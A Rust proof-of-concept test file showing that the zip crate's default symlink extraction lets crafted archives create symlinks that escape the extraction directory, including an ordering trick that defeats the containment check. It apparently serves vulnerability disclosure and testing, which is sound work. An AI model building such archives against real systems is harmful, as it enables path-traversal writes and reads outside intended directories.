//! Linux PoC:
//! The default `SymlinkExtractAction::ExtractRecursiveInFolder` creates symlinks
//! that point outside the extraction directory
//!
//! - author: sl91994
//!
//! Run:
//! `cargo test --test poc_linux -- --nocapture`

#![cfg(unix)]

use std::fs;
use std::io::Cursor;
use std::path::{Path, PathBuf};
use tempfile::TempDir;
use zip::read::{ExtractOptions, SymlinkExtractAction, root_dir_common_filter};
use zip::write::SimpleFileOptions;
use zip::{CompressionMethod, ZipArchive, ZipWriter};

/// Create `<tmp>/dest` (extraction destination) and `<tmp>/outside` (outside the extraction destination)
fn setup() -> (TempDir, PathBuf, PathBuf) {
    let tmp = TempDir::new().unwrap();
    let root = tmp.path().canonicalize().unwrap();
    let dest = root.join("dest");
    let outside = root.join("outside");
    fs::create_dir(&dest).unwrap();
    fs::create_dir(&outside).unwrap();
    (tmp, dest, outside)
}

/// Create a ZIP file containing only symlinks
fn archive(links: &[(&str, &str)]) -> ZipArchive<Cursor<Vec<u8>>> {
    let opt = SimpleFileOptions::default().compression_method(CompressionMethod::Stored);
    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    for (name, target) in links {
        zip.add_symlink(*name, *target, opt).unwrap();
    }
    zip.finish_into_readable().unwrap()
}

/// The actual path to which the symlink resolves (resolved relative to the parent of the symlink, just like in the OS)
fn resolve(link: &Path) -> Option<PathBuf> {
    let target = fs::read_link(link).ok()?;
    link.parent().unwrap().join(target).canonicalize().ok()
}

/// Non-existent target: A dangling symlink pointing outside the extraction directory is created
#[test]
fn dangling_outward_symlink_is_created() {
    let (_tmp, dest, _outside) = setup();

    let res = archive(&[("l", "../outside/missing")]).extract(&dest);
    println!("extract() returned: {res:?}");
    res.unwrap();

    let link = dest.join("l");
    let target = fs::read_link(&link).unwrap();
    println!("{} -> {:?}", link.display(), target);
    assert_eq!(target, Path::new("../outside/missing"));
}

/// Symlinks in subdirectories: Symlinks pointing to directories outside the existing extraction destination are created.
#[test]
fn subdir_symlink_to_existing_outside_dir_is_created() {
    let (_tmp, dest, outside) = setup();

    let res = archive(&[("a/b/c/l", "../../../../outside")]).extract(&dest);
    println!("extract() returned: {res:?}");
    res.unwrap();

    let link = dest.join("a/b/c/l");
    let resolved = resolve(&link);
    println!("{} resolves to {:?}", link.display(), resolved);
    assert_eq!(resolved.as_deref(), Some(outside.as_path()));
}

/// Since `extract_unwrapped_root_dir` also uses the default options, the same applies.
#[test]
fn extract_unwrapped_root_dir_is_affected() {
    let (_tmp, dest, outside) = setup();

    let res = archive(&[("root/a/b/c/l", "../../../../outside")])
        .extract_unwrapped_root_dir(&dest, root_dir_common_filter);
    println!("extract_unwrapped_root_dir() returned: {res:?}");
    res.unwrap();

    let link = dest.join("a/b/c/l");
    let resolved = resolve(&link);
    println!("{} resolves to {:?}", link.display(), resolved);
    assert_eq!(resolved.as_deref(), Some(outside.as_path()));
}

/// Ordering bypass: `l -> x/../outside` is checked while `x` does not exist yet, so `x/..` is
/// cancelled lexically. A later entry then creates `x -> .`, and the OS resolves `x/..` to the
/// parent of the extraction directory.
fn ordering_bypass(options: Option<ExtractOptions>) {
    let (_tmp, dest, outside) = setup();

    let mut zip = archive(&[("l", "x/../outside"), ("x", ".")]);
    let res = match options {
        None => zip.extract(&dest),
        Some(options) => zip.extract_with_options(&dest, options),
    };
    println!("extract() returned: {res:?}");
    res.unwrap();

    let link = dest.join("l");
    let resolved = fs::canonicalize(&link).ok();
    println!("{} resolves to {:?}", link.display(), resolved);
    assert_eq!(resolved.as_deref(), Some(outside.as_path()));
}

/// The default `ExtractRecursiveInFolder` is affected by the ordering bypass.
#[test]
fn ordering_bypass_default() {
    ordering_bypass(None);
}

/// `ExtractInFolder`, which still checks with `resolve_enclosed`, is also affected.
#[test]
fn ordering_bypass_extract_in_folder() {
    ordering_bypass(Some(
        ExtractOptions::default().symlink_action(SymlinkExtractAction::ExtractInFolder),
    ));
}
